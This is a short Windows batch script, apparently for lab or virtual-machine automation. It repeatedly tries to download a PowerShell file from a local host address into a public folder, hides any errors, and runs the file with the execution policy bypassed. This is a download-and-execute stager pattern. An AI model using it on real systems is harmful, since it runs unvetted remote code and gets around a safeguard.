@echo off
set d=C:\Users\Public\p37
cd /d %d%
del %d%\cur.ps1 2>nul
for /l %%i in (1,1,6) do (
  powershell -NoProfile -c "try{(New-Object Net.WebClient).DownloadFile('http://10.0.2.2:8080/cur.ps1','%d%\cur.ps1')}catch{}" >nul 2>&1
  if exist %d%\cur.ps1 goto run
  timeout /t 10 /nobreak >nul
)
exit /b
:run
powershell -NoProfile -ExecutionPolicy Bypass -File %d%\cur.ps1
